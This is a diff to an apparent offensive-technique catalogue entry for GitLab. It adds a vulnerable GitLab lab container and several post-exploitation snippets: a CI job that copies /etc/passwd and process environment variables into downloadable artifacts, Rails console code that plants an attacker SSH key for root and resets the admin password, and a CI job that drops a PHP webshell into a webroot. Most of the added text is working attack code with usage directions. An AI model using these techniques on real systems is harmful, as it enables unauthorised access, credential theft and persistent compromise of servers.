@@ -10,6 +10,20 @@ comment: |
   command injection in ExifTool's DjVu parser (CVE-2021-22204), achieving unauthenticated
   RCE as the `git` user on the GitLab server.
   Affects GitLab CE/EE 11.9 through 13.10.2 / 13.9.4 / 13.8.6.
+docker:
+  compose: "services:\n  gitlab:\n    image: gitlab/gitlab-ce:13.10.2-ce.0\n    ports:\n\
+    \      - \"8080:80\"\n      - \"2222:22\"\n    environment:\n      GITLAB_OMNIBUS_CONFIG:\
+    \ |\n        external_url 'http://localhost:8080'\n        gitlab_rails['gitlab_shell_ssh_port']\
+    \ = 2222\n      GITLAB_ROOT_PASSWORD: \"P@ssw0rd!\"\n    shm_size: 256m\n    volumes:\n\
+    \      - gitlab_config:/etc/gitlab\n      - gitlab_logs:/var/log/gitlab\n    \
+    \  - gitlab_data:/var/opt/gitlab\nvolumes:\n  gitlab_config:\n  gitlab_logs:\n\
+    \  gitlab_data:\n"
+  note: "Starts GitLab CE 13.10.2 (vulnerable to CVE-2021-22205 unauthenticated RCE\
+    \ via ExifTool).\nAccess at `http://localhost:8080`. Initial root password is\
+    \ printed in the logs:\n`docker compose logs gitlab | grep \"Password:\"` \u2014\
+    \ or set via `GITLAB_ROOT_PASSWORD` env var.\nFirst startup takes 3\u20135 minutes.\
+    \ Wait until `docker compose ps` shows the container as healthy.\nThe Rails console\
+    \ is accessible with: `docker compose exec gitlab gitlab-rails console`\n"
 functions:
   bind-shell:
   - code: |
@@ -61,18 +75,40 @@ functions:
       read_file:
         stage: exfil
         script:
-          - cat /etc/passwd
+          - cp /etc/passwd passwd.txt
+          - cp /proc/1/environ environ.txt || true
         artifacts:
           paths:
-            - /etc/passwd
+            - passwd.txt
+            - environ.txt
           when: always
-    comment: |
-      Exfiltrate a file from the Runner's filesystem via a CI/CD pipeline step. The artifact
-      is uploaded to GitLab and downloadable from the pipeline UI at
-      CI/CD > Pipelines > <job> > Artifacts.
+    comment: "Exfiltrate files from the Runner's filesystem via a CI/CD pipeline step.\
+      \ Files must\nbe copied into the project workspace first \u2014 artifact paths\
+      \ are relative to the\nproject directory and absolute paths are silently ignored\
+      \ by GitLab CI.\nDownload from: CI/CD > Pipelines > <job> > Artifacts.\n"
     contexts:
       authenticated:
       ci_cd:
+  file-write:
+  - code: |
+      # Add an attacker SSH public key for root access
+      File.write("/root/.ssh/authorized_keys", "ssh-ed25519 AAAA...attacker_pubkey... attacker\n")
+
+      # Or overwrite the GitLab initial root password file to reset the admin password
+      File.write("/etc/gitlab/initial_root_password", "Password: NewP@ssw0rd!\n")
+    comment: "Write arbitrary files from the GitLab Rails console on the application\
+      \ server.\nThe Rails console is accessible via `gitlab-rails console` on self-hosted\
+      \ installs\nor `docker exec -it gitlab gitlab-rails console` in containerized\
+      \ deployments.\n\nGitLab uses Puma (Ruby) and does not execute PHP \u2014 write\
+      \ OS-level files instead:\n- SSH authorized_keys: grants direct server access\
+      \ without a password\n- /etc/gitlab/initial_root_password: resets the GitLab\
+      \ admin password on next reconfigure\n- /etc/sudoers.d/git: escalates the git\
+      \ process user to root (if sudo is installed)\n- /var/opt/gitlab/gitlab-rails/public/<file>:\
+      \ places static files in the web root\n  (served as-is; use for HTML/JS payloads,\
+      \ not PHP execution)\n"
+    contexts:
+      admin:
+      console:
   rce:
   - code: |
       # Use the Metasploit module for automated payload generation and delivery:
@@ -188,4 +224,26 @@ functions:
     contexts:
       api_token:
       authenticated:
+  webshell:
+  - code: |
+      stages:
+        - drop
+
+      drop_shell:
+        stage: drop
+        script:
+          - echo '<?php if(isset($_REQUEST["c"])){system($_REQUEST["c"]);} ?>' > /var/www/html/shell.php
+        artifacts:
+          paths:
+            - shell.php
+          when: always
+    comment: |
+      Writes a PHP webshell to the Runner's filesystem via a CI/CD pipeline step, then
+      uploads it as a build artifact downloadable from the GitLab UI.
+      Navigate to: CI/CD > Pipelines > <job> > Artifacts > Download to retrieve the file.
+      For deployment: if the Runner has write access to a shared web root (common when
+      the Runner and web server share a host), set the path to the actual webroot directly.
+    contexts:
+      authenticated:
+      ci_cd:
 ...
